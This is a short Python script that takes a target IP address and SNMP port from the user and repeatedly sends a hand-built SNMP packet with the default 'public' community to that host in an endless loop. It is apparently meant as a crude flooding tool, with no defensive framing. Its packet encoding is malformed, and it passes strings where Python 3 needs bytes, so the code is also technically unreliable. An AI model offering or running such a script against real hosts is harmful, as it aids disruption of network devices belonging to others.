import socket
import random
import time

# prompt the user for target IP address and port
targetIP = input("Enter the target IP address: ")
SNMP_port = int(input("Enter the SNMP port: "))

msgVer = "\x02\x01\x01"
msgCommunity = "\x04\x06\x70\x75\x62\x6c\x69\x63"
msgPDU = "\xA2"
msgValue = "\x02\x04" + "\x00" * 4

# create a socket object
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# connect to the target IP and port
clientSocket.connect((targetIP, SNMP_port))

# send the message
clientSocket.send(msgVer + msgCommunity + msgPDU + msgValue)

# generate many requests to the same host
while True:
    clientSocket.send(msgVer + msgCommunity + msgPDU + msgValue)
    time.sleep(random.randint(1, 5))
